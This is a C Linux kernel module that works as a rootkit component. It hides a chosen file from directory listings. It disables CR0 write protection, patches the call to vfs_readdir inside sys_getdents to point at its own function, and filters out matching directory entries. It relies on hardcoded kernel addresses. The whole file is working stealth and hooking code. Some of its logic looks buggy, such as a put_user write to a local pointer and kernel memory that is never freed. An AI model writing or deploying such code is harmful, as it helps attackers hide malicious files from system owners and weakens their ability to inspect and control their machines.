#include <linux/module.h>
#include <linux/moduleparam.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/stat.h>
#include <linux/file.h>
#include <linux/dirent.h>
#include <linux/vmalloc.h>
#include <linux/uaccess.h>
#include <linux/unistd.h>
#include <linux/fs.h>

#define __CLEAR_WP__

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Yuhang");

static char *fileToHide = "";
module_param(fileToHide, charp, 0000);
MODULE_PARM_DESC(fileToHide, "Please input filename of the file to be hidden");

static unsigned long long addr_sys_getdents= 0xffffffff8119f0f0;
static unsigned long long addr_vfs_readdir = 0xffffffff8119ef30;

struct linux_dirent {
	unsigned long   d_ino;
	unsigned long   d_off;
	unsigned short  d_reclen;
	char        d_name[];
};

struct getdents_callback {
	struct linux_dirent __user *current_dir;
	struct linux_dirent __user *previous;
	int count;
	int error;
};

#ifdef __CLEAR_WP__
#define X86_CR0_WP 0x00010000

static unsigned long __force_order;

static inline unsigned long readCr0(void) {

    unsigned long val;

    asm volatile("mov %%cr0,%0\n\t" : "=r" (val), "=m" (__force_order));
    return val;
}

static inline void writeCr0(unsigned long val) {
    asm volatile("mov %0,%%cr0" : : "r" (val), "m" (__force_order));
}
#endif

/*declare vfs_readdir, this function is exported by kernel*/
int vfs_readdir(struct file *file, filldir_t filler, void *buf);

/*address 64bits to 32bits*/
static unsigned int addr_q2l(unsigned long long quad) 
{
	return quad & 0x00000000ffffffff;
}

/*address 32bits to 64bits*/
static unsigned long long addr_l2q(unsigned int lon)
{
	return (unsigned long long)lon | 0xffffffff00000000;
}

/*compare two string
 *<0 if s1<s2;
 *=0 if s1==s2;
 *>0 if s1>s2;
 * */
static int strCmp(char *s1, char *s2)
{
	int ndx1, ndx2;
	for(ndx1=0, ndx2=0; ;ndx1++,ndx2++){
		if(s1[ndx1] == '\0' && s2[ndx2] == '\0')
			return 0;
		if(s1[ndx1] == '\0' || s2[ndx2] == '\0')	
			return s1[ndx1] - s2[ndx2];
		if(s1[ndx1] < s2[ndx2]) 
			return s1[ndx1] - s2[ndx2];
		if(s1[ndx1] > s2[ndx2])
			return s1[ndx1] - s2[ndx2];
		continue;
	}
}

/*
 *handler: [in]uplevel function
 *old_func: [in]function to be hooked 
 *new_func：[in]my function 
 * */
static unsigned int patch_kernel_func(unsigned long long handler, unsigned long long old_func,
		unsigned long long new_func)
{
	unsigned char *p = (unsigned char *)handler;
	unsigned char buf[4] = "\x00\x00\x00\x00";
	unsigned int offset = 0;
	unsigned long long orig = 0;
	int i = 0;
#ifdef __CLEAR_WP__
	unsigned long cr0;
#endif

	printk(KERN_INFO "\n*** hook engine: start patch func at: 0x%016llx\n", old_func);

	while (1) {
		if (i > 512)
			return 0;

		if (p[0] == 0xe8) {
			printk(KERN_INFO "*** hook engine: found opcode 0x%02x\n", p[0]);
			
			printk("*** hook engine: call addr: 0x%016llx\n", 
				(unsigned long long)p);
			buf[0] = p[1];
			buf[1] = p[2];
			buf[2] = p[3];
			buf[3] = p[4];

			printk(KERN_INFO "*** hook engine: 0x%02x 0x%02x 0x%02x 0x%02x\n", 
				p[1], p[2], p[3], p[4]);

				/*the operand of call is not 64bits but 32 bits !!!!!*/
        		offset = *(unsigned int *)buf;
        		printk(KERN_INFO "*** hook engine: offset: 0x%08x\n", offset);
	
				/*current address is 32bits*/
        		printk(KERN_INFO "*** hook engine: current addr: 0x%08x\n", (unsigned int)p);

        		orig = addr_l2q(offset + (unsigned int)p + 5);
        		printk(KERN_INFO "*** hook engine: original func: 0x%016llx\n", orig);

			if (orig == old_func) {
				printk(KERN_INFO "*** hook engine: found old func at"
					" 0x%016llx\n", 
					old_func);

				printk(KERN_INFO "%d\n", i);
				break;
			}
		}
		p++;
		i++;
	}

	offset = addr_q2l(new_func)- (unsigned int)p - 5;

#ifdef __CLEAR_WP__
	cr0 = readCr0();
	writeCr0(cr0 & ~X86_CR0_WP);
	printk(KERN_INFO "*** hook engine: clear write protection\n");
	
	p[1] = (offset & 0x000000ff);
	p[2] = (offset & 0x0000ff00) >> 8;
	p[3] = (offset & 0x00ff0000) >> 16;
	p[4] = (offset & 0xff000000) >> 24;
	
	writeCr0(cr0);
#endif

	printk(KERN_INFO "*** hook engine: pachted new func offset.\n");

	return orig;
} 


static int hide_file(struct file *file, filldir_t filler, void *buf)
{
	int mem_size;
	int res;
	int bpos;
	int nread;
	char *filename;
	unsigned short *pre = NULL;
	unsigned char *kernel_buf;
	struct linux_dirent *d;
	struct linux_dirent __user *d_user;
	struct linux_dirent __user *user_buf_start;//preserve user buffer
	struct linux_dirent __user *user_buf_pre;//vfs_readdir go through user buffer to make change to previous and current
	struct getdents_callback *dirent_calbak;

	/*initialize*/
	nread = 0;
	dirent_calbak	= (struct getdents_callback *)buf;
	mem_size		= dirent_calbak->count;
	user_buf_start	= dirent_calbak->current_dir;		

	/*vfs_readdir make change to dirent_calbak->current and previous*/
	res = vfs_readdir(file, filler, (void *)dirent_calbak);	
	printk(KERN_INFO "hide_file:vfs_readdir:%d\n", res);	

	user_buf_pre = dirent_calbak->previous;

	/*figure out nread 
	 *according to getdents manual and getdents source code
	 * */
	if(res >= 0)
		nread = dirent_calbak->error;
	if(user_buf_pre) {
		if(put_user(file->f_pos, &user_buf_pre->d_off))	{
			res = -1;
			goto out;
		}
		else 
			nread = mem_size - dirent_calbak->count;
	}
		

	printk(KERN_INFO "hide_file:nread:%d\n", nread);	
	if(nread < 0)
		goto out;
	//to the end of directory
	if(nread == 0)
		goto out;
				
	/*allocate kernel momery*/
	kernel_buf = (unsigned char *)kmalloc(nread, GFP_KERNEL);
	/*copy from user*/
	if(copy_from_user(kernel_buf, user_buf_start, nread) >= nread) {
		printk(KERN_INFO "copy_from_user failed!\n");	
		goto out;
	}
										
	/*hide file*/
	for(bpos = 0; bpos < nread ;){  
		d = (struct linux_dirent *) (kernel_buf + bpos);
		filename = (char *)d->d_name;
		if(strCmp(filename, fileToHide) == 0){
			printk(KERN_INFO "file found %s\n", filename);
			if(pre != NULL)	{
				//put to user space
				d_user = (struct linux_dirent __user *)((unsigned char *)user_buf_start + bpos - *pre);
				put_user(*pre + d->d_reclen, &d_user->d_reclen);
			}
			else {
				//first dirent is to be hide ??
				put_user((unsigned char *)user_buf_start + d->d_reclen, 
						&user_buf_start);
			}

		}
		printk(KERN_INFO "file name:%s\n", (char *)d->d_name);
		pre = &d->d_reclen;
		bpos += d->d_reclen;
	}
	
out:
	return res;
}

static int __init hideFile_init(void)
{
	printk(KERN_INFO "init\n"); 
	printk(KERN_INFO "fileToHide:%s\n" , fileToHide);

	patch_kernel_func(addr_sys_getdents, addr_vfs_readdir, 
					(unsigned long long )hide_file);

	return 0;
}

static void __exit hideFile_exit(void)
{
	/*recover vfs_readdir*/
	patch_kernel_func(addr_sys_getdents, (unsigned long long )hide_file, 
										 addr_vfs_readdir);	
	printk(KERN_INFO "exit\n");
}

module_init(hideFile_init);
module_exit(hideFile_exit);
